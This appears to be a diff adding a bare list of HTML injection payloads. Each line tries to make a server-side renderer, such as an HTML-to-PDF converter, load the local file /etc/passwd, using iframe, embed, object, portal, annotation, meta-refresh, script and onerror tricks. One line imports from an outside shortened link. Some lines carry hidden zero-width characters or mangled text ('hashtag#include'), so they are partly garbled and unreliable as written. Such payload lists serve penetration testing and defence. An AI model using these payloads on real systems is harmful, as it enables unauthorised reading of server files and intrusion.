@@ -1,0 +1,11 @@
+<iframe src='file:///etc/passwd' width='600' height='600'>
+<embed src='file:///etc/passwd' width='600' height='600'>
+<object data='file:///etc/passwd' width='600' height='600' type='text/html'>
+<portal src='file:///etc/passwd' id='portal'>
+<link rel='attachment' href='file:///etc/passwd'>
+<annotation file='/etc/passwd' content='/etc/passwd' icon='Graph' title='Attached File' pos-x='195'>
+<​meta http-equiv='refresh' content='0;url=file:///etc/passwd'>
+<​script>window.location = "file:///etc/passwd";<​/script>
+<img src="x" onerror​="window.location='file:///etc/passwd'">
+<link rel="import" href="https://lnkd.in/gsf3JpAK">
+<!--hashtag#include file="file:///etc/passwd" -->
